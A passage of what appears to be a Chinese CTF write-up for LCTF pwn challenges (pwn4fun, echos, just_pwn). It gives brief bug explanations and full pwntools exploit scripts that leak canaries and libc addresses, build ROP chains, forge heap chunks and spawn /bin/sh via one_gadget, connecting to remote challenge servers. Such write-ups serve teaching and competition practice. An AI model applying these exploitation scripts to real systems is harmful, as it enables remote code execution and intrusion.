    cn.interactive()
    '''
    0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
    constraints:
      rcx == NULL
    0x4f322 execve("/bin/sh", rsp+0x40, environ)
    constraints:
      [rsp+0x40] == NULL
    0x10a38c    execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
    '''
## pwn4fun
看着像个三国杀游戏。。。发现注册的地方如果可以注册满10次就能覆盖fl4g字符串，登录的时候可以溢出覆盖v3就能跑get_flag函数  
游戏获胜有一个4字节的fmt，但游戏并不能胜利所以没啥用，一个思路是如何多次login，按照正常流程应该只有两次机会，到最后也没有发现有啥方法，应该是不行  
注意下卡片的种类只有三种，p,a,g，而且在弃牌回合里有问题，第二个循环没检查下限。。。考虑了下可以把ag往前挪覆盖fl4g  
首先不停重启找到一把合适的，即一步就可以直接有1 Attack 2
Guard这种情况的，然后首先保持自己不死（1血吃桃）,尽量屯牌，敌人打你的时候不要防御就可以连续弃牌了，第一次随便弃牌，第二次输入-5  
连续5次后就可以ctrl+C继续跑脚本，得到flag（当然也可以写脚本，思路差不多，先找AG，然后不要防守就行了，连续弃牌就行了）
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['gnome-terminal','-x','bash','-c']
    local = 0
    if local:
        cn = process('./sgs')
        bin = ELF('./sgs')
        #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        #libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
    else:
        cn = remote('212.64.75.161',2333)
        bin = ELF('./sgs')
        #libc = ELF('')
    def z(a=''):
        gdb.attach(cn,a)
        if a == '':
            raw_input()
    cn.sendline('')
    cn.sendlineafter('sign (I)n or sign (U)p?','I')
    cn.sendlineafter('input your name','admin\x00aa')
    cn.interactive()
    cn.sendline("I")
    cn.sendlineafter('input your name','admin\x00aa')
    cn.interactive()
## echos
read 超长到末尾以后会返回-1，然后就能不断往前写
先帖一下 **本地** exp：
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['gnome-terminal','-x','bash','-c']
    local = 0
    if local:
        cn = process('./echos')
        bin = ELF('./echos',checksec=False)
        libc = ELF('./libc64.so',checksec=False)
    else:
        # cn = remote('172.81.214.122', 6666)
        cn = remote('0',10003)
        bin = ELF('./echos',checksec=False)
        libc = ELF('./libc64.so',checksec=False)
        pass
    def z(a=''):
        if local:
            gdb.attach(cn,a)
            if a == '':
                raw_input()
    prdi=0x00000000004013c3
    prsi_r15=0x00000000004013c1
    gadget=0x00000000004013bd  # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    readn=0x00000000004011A6
    pay = '8000\x00\x00\x00\x00' #r12
    pay+=p64(0)*3
    pay+=p64(gadget) + p64(0x0000000000403440) #rsp
    cn.sendlineafter('size',pay)
    size=0x3c0
    sleep(0.2)
    pay = p64(0x00000000004013B6)+p64(0x0000000000401190)
    pay = pay.ljust(0x440-size,'a')
    pay+=p64(0)*3
    pay+=p64(prdi)+p64(bin.got['read'])+p64(bin.plt['puts'])
    pay+=p64(prdi)+p64(bin.got['exit'])+p64(prsi_r15)+p64(0x10)*2+p64(readn)
    pay+=p64(prdi)+p64(0x4034b8)+p64(bin.plt['exit'])+'/bin/sh\x00'
    pay = pay.ljust(0x1000-size,'a')[:-1]
    pay+='\n'
    cn.send(pay)
    cn.recvuntil(':')
    cn.recvuntil(':\n')
    lbase = u64(cn.recvuntil('\n')[:-1].ljust(8,'\x00'))-libc.sym['read']
    success('lbase: '+hex(lbase))
    system = libc.sym['system']+lbase
    cn.sendline(p64(system))
    cn.interactive()
LCTF{sw_1s_coooooool!}
## just_pwn
exp：
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['gnome-terminal','-x','bash','-c']
    local = 0
    if local:
        bin = ELF('./just_pwn_p',checksec=False)
        cn2 = process('./just_pwn_p')
        cn = process('./just_pwn')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
    else:
        bin = ELF('./just_pwn_p',checksec=False)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
        cn2 = process('./just_pwn_p')
        cn = remote('118.25.148.66', 2333)
        pass
    def z(a=''):
        if local:
            gdb.attach(cn,a)
            if a == '':
                raw_input()
    # login
    cn2.sendlineafter('it','1')
    cn2.recvuntil(':\n')
    token = cn2.recvuntil('\n')[:-1]
    success(token)
    cn2.close()
    cn.sendlineafter('it','2')
    cn.sendlineafter(':',token)
    # canary
    cn.sendlineafter('developer','3')
    for i in range(10):
        cn.sendlineafter('confirm','n')
    # z('b read\nc')
    cn.sendlineafter('confirm','y')
    cn.sendafter(':','a'*9)
    cn.recvuntil('a'*9)
    canary = u64('\x00'+cn.recv(7))
    success('canary: '+hex(canary))
    stack = u64(cn.recv(6).ljust(8,'\x00'))
    success('stack: '+hex(stack)) # offset +0x40
    cn.sendlineafter('developer','3')
    cn.sendlineafter('confirm','y')
    cn.sendafter(':','a'*0x40)
    cn.recvuntil('a'*0x40)
    lbase = u64(cn.recv(6).ljust(8,'\x00'))-libc.sym['_IO_2_1_stdout_']
    success('lbase: '+hex(lbase))
    ####################
    # z('c')
    cn.sendlineafter('developer','1')
    cn.sendlineafter('?',str(0x20))
    #content fake head
    pay = p64(0)+p64(0x51)
    cn.sendlineafter(':',pay)
    # overflow to ptr
    stack+=0x50
    success('stack: '+hex(stack))
    pay = 'W'*32+p64(stack+0x10)
    cn.sendlineafter(':',pay)
    one = lbase+0x45216
    cn.sendlineafter('confirm','n')
    cn.sendlineafter('confirm','y')
    cn.sendlineafter('?',str(0x48))
    pay = 'a'*0x18+p64(canary)+p64(0)*3+p64(one)
    cn.sendlineafter(':',pay)
    cn.sendlineafter(':','asd')
    cn.interactive()
    '''
    0x45216 execve("/bin/sh", rsp+0x30, environ)
    constraints:
      rax == NULL
    0x4526a execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL
    0xf02a4 execve("/bin/sh", rsp+0x50, environ)
    constraints:
      [rsp+0x50] == NULL
    0xf1147 execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
    '''
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['gnome-terminal','-x','bash','-c']
    local = 1
    if local:
        cn = process('./just_pwn.bak')
        p = process('./just_pwn')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
        #libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
    else:
        cn = remote('118.25.148.66',2333)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
    def z(a=''):
        gdb.attach(cn,a)
        if a == '':
            raw_input()
    p.sendline('1')
    p.recvuntil('These is your secretcode:\n')
    s = p.recvline()
    p.close()
    cn.sendline('2')
    cn.send(s)
    cn.sendline('3')
    for i in range(5):
        cn.sendline('n')
    cn.sendline('y')
    cn.sendlineafter('software:','a'*8)
    cn.recvuntil('aaaaaaaa\n')
    canary = u64(cn.recv(7).rjust(8,'\x00'))
    success('canary:' + hex(canary))
    stack = u64(cn.recv(6).ljust(8,'\x00'))
    success('stack:' + hex(stack))
    cn.sendline('3')
    cn.sendline('y')
    cn.sendline('a' * 0x7)
    cn.recvuntil('a' *0x7 + '\n')
    lbase = u64(cn.recv(6).ljust(8,'\x00'))-0x78BFF
    success('lbase:' + hex(lbase))
    cn.sendline('1')
    cn.sendlineafter('How long is your message?','32')
    buf = '\x00'*0x10
    buf+= p64(0) + p64(0x81)[:-1]
    cn.sendafter('message:',buf)
    buf = p64(0x11)
    buf+= p64(0) + p64(0x11)
    buf+= p64(0) + p64(stack+0x70)
    cn.sendafter('title of your message:',buf)
    cn.sendafter('y to confirm','n')
    cn.sendafter('y to confirm','y')
    cn.sendlineafter('How long',str(0x78))
    one = lbase + 0xf02a4
    buf = p64(0) + p64(canary) + '\x00' * 0x10
    buf+= 'b' * 8 + p64(one)
    cn.sendlineafter('message:',buf)
    print(hex(one))
    cn.sendlineafter('message:','aaa')
    cn.interactive()
    #guest_account:0004;guestname:user
    '''
    0x4526a execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL
    0xcd0f3 execve("/bin/sh", rcx, r12)
    constraints:
      [rcx] == NULL || rcx == NULL
      [r12] == NULL || r12 == NULL
    0xcd1c8 execve("/bin/sh", rax, r12)
    constraints:
      [rax] == NULL || rax == NULL
      [r12] == NULL || r12 == NULL
    0xf02a4 execve("/bin/sh", rsp+0x50, environ)
    constraints:
      [rsp+0x50] == NULL
    0xf1147 execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
    0xf66f0 execve("/bin/sh", rcx, [rbp-0xf8])
    constraints:
      [rcx] == NULL || rcx == NULL
      [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL
    '''